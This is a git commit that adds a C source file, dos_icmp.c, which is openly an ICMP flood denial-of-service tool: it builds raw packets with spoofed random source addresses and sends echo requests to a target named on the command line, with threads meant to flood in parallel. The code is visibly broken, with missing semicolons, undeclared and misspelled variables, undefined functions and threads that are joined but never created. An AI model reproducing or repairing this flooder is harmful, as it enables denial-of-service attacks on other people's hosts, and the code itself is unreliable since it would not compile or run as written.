1e2b69a87b6b318cdc176c648c234eb0fe6f8742
gongwenbo <gongwenbotarsbot@gmail.com>
2016-12-06 23:49:22 +0800

    add OriginalSocket_13/Dos_icmp

---
+++ OriginalSocket_13/Dos_icmp/dos_icmp.c
@@ -0,0 +1,211 @@
+#include<stdio.h>
+#include<ctype.h>
+#include<unistd.h>
+#include<fcntl.h>
+#include<signal.h>
+#include<sys/time.h>
+#include<sys/types.h>
+#include<sys/socket.h>
+#include<netdb.h>
+#include<error.h>
+#include<stdlib.h>
+#include<time.h>
+
+#define MAXCHILD 128
+static unsigned long dest=0;
+static int PROTO_ICMP=-1;
+static alive=-1;
+
+static inline long myrandom(int begin,int end)
+{
+	int gap=end-begin +1;
+	int ret=0;
+	
+	srand((unsigned)time(0));
+	ret=random(end)%gap + begin;
+	return ret;
+	
+}
+
+static void Dos_icmp(void)
+{
+	struct sockaddr_in to;
+	struct ip *iph;
+	struct icmp *icmph;
+	char *packet;
+	int pktsize=sizeof(struct ip)+sizeof(struct icmp)+64;
+	packet=malloc(pktsize);
+	iph=(struct ip*)packet;
+	icmph=(struct icmp*)(packet+sizeof(struct ip));
+	memset(packet,0,pktsize);
+ 
+	//ip的头部封装
+	iph->ip_v=4;
+	iph->ip_hl=5;
+	iph->ip_tos=0;
+	iph->ip_len=htons(pktsize);
+	iph->ip_id=htons(getid());
+	iph->ip_off=0;
+	iph->ip_ttl=0x0;
+	iph->ip_sum=0;
+	iph->ip_src=(unsigned long )myrandom(0,65535);
+	iph->ip_dst=dest;
+
+    //icmp requset
+	icmp->icmp_type=ICMP_ECHO;
+	icmp->icmp_code=0;
+	/* 由于数据部分为0,并且代码为0,直接对不为0即icmp_type部分计算 */
+	icmp->icmp_sum=htons(~(ICMP_ECHO<<8));  
+	
+	to.sin_family=AF_INET;
+	to.sin_addr.s_addr=iph->ip_dst;
+	to.sin_port=htons(0)
+	
+	sendto(rawsock,packet,pktsize,0,(struct sockaddr *)&to,
+		   sizeof(struct sockaddr));
+	free(pakcet);
+	
+}
+
+static void Dos_fun(unsigned long ip)
+{
+	while(alive)
+	{
+		icmp();
+	}
+}
+
+static void Dos_sig(int signo)
+{
+	alive=0;
+}
+
+int main(int argc,char *argv[])
+{
+	struct hostent *host=NULL;
+	struct protoent *protocol=NULL;
+	char protoname[]="icmp";
+	int i =0;
+	pthread_t pthread[MAXCHILD ];
+	int err=-1;
+	
+	alive=1;
+	signal(SIGNT,Dos_sig);
+	if(argc<2){
+		return -1;
+	}
+	
+	protocol=getprotobyname(protoname);
+	if(protocol == NULL){
+		perror("getprotobyname()");
+		return -1;
+	}
+
+	PROTO_ICMP=protocol->p_proto;
+	dest=inet_addr(argv[1]);
+	if(dest==INADDR_NONE){
+		host=gethostbyname(argv[1])
+		if(host==NULL){
+			perror("gethostbyname");
+			return -1;
+		}
+
+		memcpy((char *)&dest,host->h_addr.s_addr,host->h_length);
+		
+	}
+
+	// built original socket
+	rawsock=socket(AF_INET,SOCK_RAW,RAW);
+	if(rawsock<0)
+		rawsock=socket(AF_INET,SOCK_RAW,PROTO_ICMP);
+	
+	//set option of ip packet
+	setsockopt(rawsock,SOL_IP,IP_HDRINCL,"1",sizeof("1"));
+
+	//work on many pthreads
+	for(i=0;i<MAXCHILD;i++)
+	{
+		pthread_join(pthread[i],NULL);
+	}
+
+	close(rawsock);
+	return 0;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
